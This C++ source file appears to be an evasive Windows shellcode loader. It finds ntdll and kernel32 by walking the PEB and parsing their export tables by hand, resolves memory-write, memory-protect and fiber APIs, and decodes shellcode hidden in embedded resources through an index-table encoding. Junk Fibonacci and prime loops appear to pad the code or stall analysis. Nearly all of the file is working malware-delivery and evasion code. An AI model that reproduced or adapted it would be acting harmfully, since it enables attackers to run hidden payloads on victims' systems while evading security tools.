#include "helper.h"

#ifdef _WIN64
PPEB peb = (PPEB)__readgsqword(0x60);
#endif
#ifdef _X86_
PPEB peb = (PPEB)__readfsdword(0x30);
#endif

HMODULE hNtdll = R0myGetModuleHandle(L"ntdll.dll");
pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)myGetProcAddr(hNtdll, "NtProtectVirtualMemory");
pNtClose NtClose = (pNtClose)myGetProcAddr(hNtdll, "NtClose");
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)myGetProcAddr(hNtdll, "NtWriteVirtualMemory");
pZwAllocateVirtualMemory ZwAllocateVirtualMemory = (pZwAllocateVirtualMemory)(myGetProcAddr(hNtdll, "ZwAllocateVirtualMemory"));
pNtQueryVirtualMemory myNtQueryVirtualMemory = (pNtQueryVirtualMemory)myGetProcAddr(hNtdll, "NtQueryVirtualMemory");
pConvertThreadToFiber myConvertThreadToFiber = (pConvertThreadToFiber)myGetProcAddr(R0myGetModuleHandle(L"kernel32.dll"), "ConvertThreadToFiber");
pCreateFiber myCreateFiber = (pCreateFiber)myGetProcAddr(R0myGetModuleHandle(L"kernel32.dll"), "CreateFiber");
pSwitchToFiber mySwitchToFiber = (pSwitchToFiber)myGetProcAddr(R0myGetModuleHandle(L"kernel32.dll"), "SwitchToFiber");

void getExportTable(HMODULE module, PIMAGE_EXPORT_DIRECTORY* exportTable) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)module;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)module + pDosHeader->e_lfanew);

	IMAGE_DATA_DIRECTORY dataDir = (IMAGE_DATA_DIRECTORY)pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	*exportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)module + dataDir.VirtualAddress);
}
FARPROC myGetProcAddrIn(HMODULE module, PIMAGE_EXPORT_DIRECTORY exportTable, LPCSTR funcName) {
	PDWORD NameArray = (PDWORD)((DWORD64)module + exportTable->AddressOfNames);
	PDWORD AddressArray = (PDWORD)((DWORD64)module + exportTable->AddressOfFunctions);
	PWORD  OrdinalArray = (PWORD)((DWORD64)module + exportTable->AddressOfNameOrdinals);

	for (SIZE_T i = 0; i < exportTable->NumberOfNames; i++) {
		LPCSTR currentName = (LPCSTR)((DWORD64)module + NameArray[i]);
		if (strcmp(funcName, currentName) == 0) {
			return (FARPROC)((DWORD64)module + AddressArray[OrdinalArray[i]]);
		}
	}
	return NULL;
}

FARPROC myGetProcAddr(HMODULE module, LPCSTR funcName) {
	PIMAGE_EXPORT_DIRECTORY exportTable;
	getExportTable(module, &exportTable);

	return myGetProcAddrIn(module, exportTable, funcName);
}

HMODULE WINAPI R0myGetModuleHandle(
	_In_opt_ LPCWSTR lpModuleName
) {
	PPEB_LDR_DATA ldrData = peb->LoaderData;
	PLIST_ENTRY moduleList = &ldrData->InLoadOrderModuleList;

	PLIST_ENTRY current = moduleList->Flink;

	while (current != moduleList) {
		PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)current;
		if (_wcsnicmp(entry->BaseDllName.Buffer, lpModuleName, wcslen(lpModuleName)) == 0) {
			return (HMODULE)entry->DllBase;
		}
		current = current->Flink;
	}
	return NULL;
}

pLoadLibrary myLoadLibrary = (pLoadLibrary)myGetProcAddr(R0myGetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

HMODULE WINAPI R3myGetModuleHandle(
	_In_opt_ LPCWSTR lpModuleName) {
	return myLoadLibrary(lpModuleName);
}

HANDLE WINAPI myGetCurrentProcess(
	VOID
) {
	return (HANDLE)-1;
}

HANDLE WINAPI myGetCurrentThread(
	VOID
) {
	return (HANDLE)-2;
}

using namespace std;

vector<string> parse_resource_data(LPVOID addr, size_t len) {
	unsigned char* data = reinterpret_cast<unsigned char*>(addr);
	vector<string> parsed_strings;
	stringstream current_string;

	for (size_t i = 0; i < len; ++i) {
		if (data[i] == 0x22) {  // 双引号ASCII码
			if (!current_string.str().empty()) {
				parsed_strings.push_back(current_string.str());
				current_string.str("");
			}
		}
		else if (data[i] != 0x2c && data[i] != 0x20) {
			current_string << static_cast<char>(data[i]);
		}
	}

	return parsed_strings;
}
vector<unsigned char> restoreShellcode(LPVOID addr, size_t len, const vector<string>& table) {
	unordered_map<string, int> indexMap;
	for (size_t i = 0; i < table.size(); ++i) {
		indexMap[table[i]] = i;
	}

	vector<unsigned char> shellcode;
	string current_string;
	unsigned char* data = reinterpret_cast<unsigned char*>(addr);

	for (size_t i = 0; i < len; ++i) {
		if (data[i] == 0x00) {  // 遇到0x00表示一个字符串结束
			if (!current_string.empty()) {
				auto it = indexMap.find(current_string);
				if (it != indexMap.end()) {
					// 将对应的索引添加到 shellcode 中
					shellcode.push_back(it->second);
				}
				current_string.clear();
			}
		}
		else {
			current_string += static_cast<char>(data[i]);
		}
	}

	return shellcode;
}
vector<unsigned char> loadShellcode() {
	HRSRC hRsrcTable = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL hGlobalTable = LoadResource(NULL, hRsrcTable);
	LPVOID addr = LockResource(hGlobalTable);
	size_t len = SizeofResource(NULL, hRsrcTable);
	vector<string> table = parse_resource_data(addr, len);

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	addr = LockResource(hGlobal);
	len = SizeofResource(NULL, hRsrc);
	auto shellcode = restoreShellcode(addr, len, table);

	return shellcode;
}

int junk() {
	// 斐波那契数列计算前500项
	int a = 0, b = 1, c;
	for (int i = 0; i < 500; i++) {
		c = a + b;
		a = b;
		b = c;
	}
	return b;
}
void doSome() {
	for (int i = 2; i < 100; i++) {
		for (int j = 2; j < i; j++) {
			if (i % j == 0) {
				junk();
				break;
			}
			if (j == i - 1) {
			}
		}
	}
}